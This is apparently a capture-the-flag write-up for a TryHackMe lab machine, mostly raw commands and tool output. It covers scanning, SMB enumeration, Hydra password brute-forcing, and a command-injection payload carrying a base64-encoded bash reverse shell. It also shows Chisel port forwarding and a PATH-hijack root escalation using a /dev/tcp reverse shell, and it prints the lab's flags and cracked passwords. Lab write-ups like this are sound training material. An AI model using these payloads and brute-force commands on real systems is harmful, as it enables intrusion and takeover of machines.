@@ -1,0 +1,150 @@
+Trickster
+
+└─$ nmap -A -p- 10.10.153.225               
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 19:47 GMT
+Nmap scan report for 10.10.153.225
+Host is up (0.035s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT    STATE SERVICE     VERSION
+80/tcp  open  http        Apache httpd 2.4.52
+|_http-title: 401 Unauthorized
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=You want in? Gotta guess the password!
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+Service Info: Host: ip-10-10-153-225.eu-west-1.compute.internal
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-10-31T19:47:47
+|_  start_date: N/A
+|_clock-skew: -1s
+|_nbstat: NetBIOS name: ASGARD, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.74 seconds
+
+enum4linux
+
+Domain Name: ASGARD
+user:[loki] rid:[0x3e9]
+
+S-1-22-1-1000 Unix User\loki (Local User)
+S-1-22-1-1001 Unix User\alligator (Local User)
+
+S-1-5-21-2658623707-4023037429-2031541027-501 ASGARD\nobody (Local User)
+S-1-5-21-2658623707-4023037429-2031541027-513 ASGARD\None (Domain Group)
+S-1-5-21-2658623707-4023037429-2031541027-1001 ASGARD\loki (Local User)
+
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
+
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+
+hydra -l alligator -P /usr/share/wordlists/rockyou.txt 10.10.153.225 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect login"
+
+[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "http-get" instead.
+
+└─$ hydra -l alligator -P /usr/share/wordlists/rockyou.txt 10.10.153.225 http-get /     
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-31 20:15:20
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-get://10.10.153.225:80/
+[STATUS] 425.00 tries/min, 425 tries in 00:01h, 14343974 to do in 562:31h, 16 active
+[STATUS] 434.67 tries/min, 1304 tries in 00:03h, 14343095 to do in 549:58h, 16 active
+[80][http-get] host: 10.10.153.225   login: alligator   password: barkley
+
+JS filter code :
+
+var _0x48ef=['keyup','value','target','preventDefault','addEventListener','test','keyCode'];(function(_0x57ee59,_0x48ef0f){var _0x2911af=function(_0x4f1ea3){while(--_0x4f1ea3){_0x57ee59['push'](_0x57ee59['shift']());}};_0x2911af(++_0x48ef0f);}(_0x48ef,0x1d5));var _0x2911=function(_0x57ee59,_0x48ef0f){_0x57ee59=_0x57ee59-0x0;var _0x2911af=_0x48ef[_0x57ee59];return _0x2911af;};window['onload']=function(){var _0x31dff8=document['getElementById'](_0x2911('0x2'));_0x31dff8[_0x2911('0x1')]='';_0x31dff8[_0x2911('0x4')](_0x2911('0x0'),function(_0x18bdaf){if(_0x18bdaf[_0x2911('0x6')]===0xd){_0x18bdaf[_0x2911('0x3')]();submit();}if(/^[A-Za-z0-9. ]*$/[_0x2911('0x5')](_0x31dff8[_0x2911('0x1')])==![]){_0x31dff8[_0x2911('0x1')]='';}});};
+
+
+How I bypass the filter to get a reverse shell as www-data
+
+{"target":"\" \necho L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjIxLjc4LjE0Mi80NDQ1IDA+JjEK | base64 -d | bash\n"}
+
+cat /var/www/files/web.txt : EPI{I_H4v3_4n_4RmY_4nd_Y0u_C4nT_St4p_M3}
+
+linpeas => ssh only running localy and only user loki can connect => forwarding port ssh
+
+download chisel binary on the target machine
+
+Using Chisel
+
+Sur ma machine
+./chisel server -host <MON_IP> -port 6666 --reverse
+
+Sur la machine victime
+./chisel client <IP>:6666 R:9846:127.0.0.1:22/tcp
+
+└─$ hydra -l loki -P /usr/share/wordlists/rockyou.txt ssh://10.21.78.142 -s 9846
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-01 09:29:45
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.21.78.142:9846/
+[9846][ssh] host: 10.21.78.142   login: loki   password: claudia
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.
+[ERROR] 3 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-01 09:29:51
+
+ssh loki@10.21.78.142 -p 9846
+
+password : claudia
+
+cat user.txt : EPI{L0v3_iS_T4ulY_4_D4gG3r}
+
+loki@asgard:~$ sudo -l
+Matching Defaults entries for loki on asgard:
+    env_reset, mail_badpass
+
+User loki may run the following commands on asgard:
+    (root) NOPASSWD: /usr/sbin/shutdown
+
+loki@asgard:~$ strings /usr/sbin/shutdown
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+system
+__cxa_finalize
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+AWAVI
+AUATL
+[]A\A]A^A_
+poweroff => the binary poweroff isn't in absolut path so we canbinary hidjacking
+;*3$"
+
+vim poweroff
+
+#!/bin/bash
+/bin/bash -i >& /dev/tcp/10.21.78.142/4444 0>&1
+
+sudo /usr/sbin/shutdown
+
+Got a shell as root
+
+cat /root/root.txt = troll file
+
+so I search and I found a file in alligator's home which have only the root read perm and in it I got the root flag
+
+EPI{I_H4V3_B33n_f4lL1ng_F0r_W1y_t00_L0ng}
+
+CF : THM bow (THE YEAR OF THE FOX)
